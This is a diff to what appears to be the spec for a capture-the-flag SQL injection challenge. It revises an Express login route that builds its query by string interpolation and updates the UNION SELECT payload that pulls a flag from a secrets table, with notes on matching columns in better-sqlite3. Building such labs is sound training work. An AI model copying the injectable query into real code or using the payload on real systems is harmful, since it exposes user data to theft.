@@ -15,9 +15,15 @@
 // VULNERABLE: sqli_union — raw string interpolation
 app.post('/login', (req, res) => {
     const { username, password } = req.body;
+    // VERY IMPORTANT for better-sqlite3: The UNION SELECT must return columns that match 
+    // the property names expected by the Javascript code (e.g. `flag`, or `username`).
+    // Example: A user object will have `username`, `password`, `flag` if selected from users
     const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
     const user = db.prepare(query).get();
-    if (user) return res.send("Welcome! " + user.flag);
+    
+    // Check if we got a user back, and print properties that might contain the flag
+    // (e.g., in a UNION attack we might alias a column: SELECT flag as username FROM secrets)
+    if (user) return res.send("Welcome! " + (user.flag || user.username || JSON.stringify(user)));
     return res.status(401).send("Invalid credentials");
 });
 ```
@@ -61,10 +67,12 @@ Replace `FLAG_PLACEHOLDER` with the actual flag value.
 
 ## Exploit Payload
 ```
-username: ' UNION SELECT flag,null FROM secrets--
+username: ' UNION SELECT null, null, flag, null FROM secrets--
 password: anything
 ```
-POST to `/login` with form data.
+*Note*: The number of `null`s depends strictly on the schema of the injected table. In Node.js with `better-sqlite3`, it maps the result sets column names to JavaScript object keys. If the Javascript expects `user.flag`, you should ensure the UNIONed column containing the flag is aliased to `flag` (e.g. `SELECT flag as flag...`) or is in the correct column position.
+
+POST to `/login` with form data or JSON payload.
 
 ## Docker Setup
 ```yaml
